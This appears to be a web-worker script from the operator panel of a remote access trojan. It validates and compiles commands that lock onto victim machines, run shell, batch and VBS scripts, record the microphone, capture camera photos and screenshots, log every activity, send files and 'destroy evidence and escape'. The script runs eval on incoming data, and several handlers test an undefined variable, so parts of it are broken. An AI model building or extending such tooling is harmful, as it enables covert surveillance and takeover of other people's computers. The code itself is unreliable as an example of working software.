onmessage = function (event) {
 var code = ""; // Optimized code (string)
 var txt = "Code Summary:"; //Summary txt
 // General Array Format: [Error, Err desc(txt), Err desc(markup), target|class|all, target_spcified?(0|1|2|3),"empty optCode"]
 // arr[4]=> 0: Not specified, 1: Target, 2:Class, 3:All
 var arr = [false, "txt", "html", "target", 0, ""];

 var PC = {
  Lock: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Target Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Lock(<grn>target_name</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     if (arr[4] !== 0) {
      arr[0] = true;
      arr[1] = "Mulitple Target selectors";
      arr[2] = "<red>Program Error</red><br><br>Program contains more than one Target selectors<br><br>Compiler failed with exit code 1FXX";
     } else {
      arr[3] = x;
      arr[4] = 1;
     }
    }
   }
  },

  Class: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Class Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Class(<grn>class_name</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     if (arr[4] !== 0) {
      arr[0] = true;
      arr[1] = "Mulitple Target selectors";
      arr[2] = "<red>Program Error</red><br><br>Program contains more than one Target selectors<br><br>Compiler failed with exit code 1FXX";
     } else {
      arr[3] = x;
      arr[4] = 2;
     }
    }
   }
  },

  All: () => {
   if (!arr[0]) {
    if (arr[4] !== 0) {
     arr[0] = true;
     arr[1] = "Mulitple Target selectors";
     arr[2] = "<red>Program Error</red><br><br>Program contains more than one Target selectors<br><br>Compiler failed with exit code 1FXX";
    } else {
     arr[3] = "All Systems";
     arr[4] = 3;
    }
   }
  },
  Escape: () => {
   if (!arr[0]) {
    txt += "<br>- Destroy Evidence and Escape";
    code += "Escape();\n";
   }
  },

  Marco: () => {
   if (!arr[0]) {
    if (arr[4] == 0) {
     arr[0] = true;
     arr[1] = "Marco Requires a Target";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Lock(<grn>target_name</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else if (arr[4] == 1) {
     txt += "<br>- Returns Polo if Online";
     code += "Marco();\n";
    } else {
     arr[0] = true;
     arr[1] = "Marco is not available for Multiple systems";
     arr[2] = "<red>Program Error</red><br><br>Macro cannot be used for Mulitple targets<br><br>Compiler failed with exit code 1FXX";
    }
   }
  },

  Exit: () => {
   if (!arr[0]) {
    txt += "<br>- End RAT Process";
    code += "Exit();\n";
   }
  },

  Update: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Requires Firmware file URL";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Update(<grn>firmware_url</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Updates firmware";
     code += `Update("${x}");\n`;
    }
   }
  },

  Hibernate: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Date Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Hibernate(<grn>till_date</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Hibernate till date";
     code += `Hibernate("${x}");\n`;
    }
   }
  },
  Clone: (x, y) => {
   if (!arr[0]) {
    if (arr[4] == 0) {
     arr[0] = true;
     arr[1] = "Cloning Requires a Target";
     arr[2] = "<red>Program Error</red><br><br>Expecting A Target selector, PC.Lock(<grn>target_name</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else if (arr[4] == 1) {
     if (x == undefined || y == undefined) {
      arr[0] = true;
      arr[1] = "Arguments Cannot be Empty";
      arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Clone(<grn>Alias_name</grn>,(<grn>Icon_url</grn>)<br><br>Compiler failed with exit code 1FXX";
     } else {
      txt += "<br>- Initiate Clone Operations";
      code += `Clone("${x}","${y}");\n`;
     }
    } else {
     arr[0] = true;
     arr[1] = "Cloning is not available for Multiple systems";
     arr[2] = "<red>Program Error</red><br><br>Cloning cannot be used for Mulitple targets<br><br>Compiler failed with exit code 1FXX";
    }
   }
  },

  NClone: () => {
   if (!arr[0]) {
    if (arr[4] == 0) {
     arr[0] = true;
     arr[1] = "NClone() Requires a Target";
     arr[2] = "<red>Program Error</red><br><br>Expecting A Target selector, PC.Lock(<grn>target_name</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else if (arr[4] == 1) {
     txt += "<br>- Terminates Cloning operations";
     code += "NClone();";
    } else {
     arr[0] = true;
     arr[1] = "NClone() is not available for Multiple systems";
     arr[2] = "<red>Program Error</red><br><br>NClone() cannot be used for Mulitple targets<br><br>Compiler failed with exit code 1FXX";
    }
   }
  },
  Excape: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Excape(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Execute Batch script and Escape()";
    }
   }
  },

  Revive: () => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Revive(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- End Hibernation  ";
    }
   }
  },

  Notify: () => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Notify(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Notifies power schedule";
    }
   }
  },

  Rename: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Rename(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Renames RAT";
    }
   }
  },

  Flash: () => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Flash(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Flashes Screen, Visual Indication";
    }
   }
  },

  Vbs: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Vbs(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Runs .VBS Script";
    }
   }
  },

  Bat: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Bat(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Runs .Bat Script";
    }
   }
  },

  Shell: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Shell(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Runs Shell Commands";
    }
   }
  },

  Speak: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Speak(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Text to Speech";
    }
   }
  },

  Play: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Audio ref Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Play(<grn>*.mp3</grn>)<br><br>Compiler failed with exit code 1F96";
    } else {
     txt += "<br>- Plays a Remote Audio file on host PC";
    }
   }
  },

  Mic: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Mic(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Records audio for 'x' ms";
    }
   }
  },

  Info: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Info(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Shows Info box";
    }
   }
  },

  Warn: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Warn(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Shows Warning Box";
    }
   }
  },

  Error: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Error(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Shows Error box";
    }
   }
  },

  Timebox: (x, y) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Msgbox(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Shows Msg Box fo 'y' ms";
    }
   }
  },
  Prompt: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Query Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Prompt(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Prompts user for an input.";
    }
   }
  },
  Google: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Query Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Google(<grn>query</grn>)<br><br>Compiler failed with exit code 1F69";
    } else {
     txt += "<br>- Googles the selected Query";
    }
   }
  },

  Web: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Web(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Navigates to 'x' url";
    }
   }
  },

  Type: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Type(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Types custom text";
    }
   }
  },

  Screenshot: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Screenshot(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Takes a Screenshot";
    }
   }
  },

  Camera: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Camera(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Captures a Photo";
    }
   }
  },

  Details: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Disk(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Retrieves Disk Info";
    }
   }
  },
  Disk: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Disk(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Retrieves Disk Info";
    }
   }
  },

  Tree: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Tree(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Retrieves Disk Info";
    }
   }
  },

  Send: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Send(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Sends a File";
    }
   }
  },

  Download: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Send(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Sends a File";
    }
   }
  },

  Zip: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Zip(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Zip a folder";
    }
   }
  },

  Unzip: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Unzip(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Unzips file";
    }
   }
  },

  Health: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Health(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Reports back working conditions";
    }
   }
  },

  Log: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Log(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Logs every Activity";
    }
   }
  },

  Delay: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Delay(<grn>milliseconds</grn>)<br><br>Compiler failed with exit code 1F84";
    } else {
     txt += "<br>- Adds temporarily delay";
    }
   }
  },

  Shutdown: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Shutdown(<grn>milliseconds</grn>)<br><br>Compiler failed with exit code 1F84";
    } else {
     txt += "<br>-  Shutsdown the system after 'x' ms";
    }
   }
  },
 };

 try {
  eval(event.data);
 } catch (e) {
  arr[0] = true;
  arr[1] = e;
  arr[2] = "<red>Program Error</red><br><br>Compiler failed with exit code 1F206";
 }

 if (!arr[0] && !arr[4]) {
  arr = [true, "Target Not specified", "<red>Program Error</red><br><br>Syntax: PC.Lock(<grn>target_name</grn>)<br><br>Compiler failed with exit code 1F43", "", 0, ""];
 }
 arr[0] ? postMessage(arr) : txt == "Code Summary:" ? postMessage([false, "Ready to Run on: '" + arr[3] + "'", "<grn>Program Compiled succesfully..</grn><br><br>- No Actions to perform.", arr[3], arr[4], code]) : postMessage([false, "Ready to Run on: '" + arr[3] + "'", "<grn>Program Compiled succesfully..</grn><br><br>" + txt, arr[3], arr[4], code]);
};